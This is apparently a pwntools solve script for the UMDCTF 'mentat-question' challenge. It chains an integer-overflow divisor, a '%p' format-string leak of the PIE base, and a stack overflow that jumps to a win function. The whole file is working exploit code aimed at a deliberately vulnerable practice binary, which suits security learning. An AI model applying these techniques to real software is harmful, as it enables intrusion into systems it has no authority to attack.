from pwn import *
from icecream import ic

elf = exe = ELF("./mentat-question")

context.binary = exe
context.log_level = "debug"
context.aslr = True

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    sys.argv += ' '
    if sys.argv[1] == 'r':
        args.REMOTE = True
    elif sys.argv[1] == 'd':
        args.GDB = True
    
    if args.REMOTE:
        return remote("challs.umdctf.io", 32300)
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

gdbscript = '''

c
'''.format(**locals())

def sl(a): return io.sendline(a)
def s(a): return io.send(a)
def sa(a, b): return io.sendafter(a, b)
def sla(a, b): return io.sendlineafter(a, b)
def re(a): return io.recv(a)
def ru(a): return io.recvuntil(a)
def rl(): return io.recvline()
def i(): return io.interactive()

io = start()

ru("Hello young master. What would you like today?")
sl("Division")
ru("Which numbers would you like divided?")
sl("1")
sl("4294967296")
ru("Would you like to try again?")
sl("Yes %p")
ru("Yes ")

elf.address = int(re(14).decode(), 16) - 0x206d
ret = elf.address + 0x101a
win = elf.address + 0x11d9
payload = b"Yes ".ljust(24, b'a')
payload += p64(ret)
payload += p64(win)

ru("Which numbers would you like divided?")
sl("1")
sl("4294967296")
ru("Would you like to try again?")
sl(payload)

i()
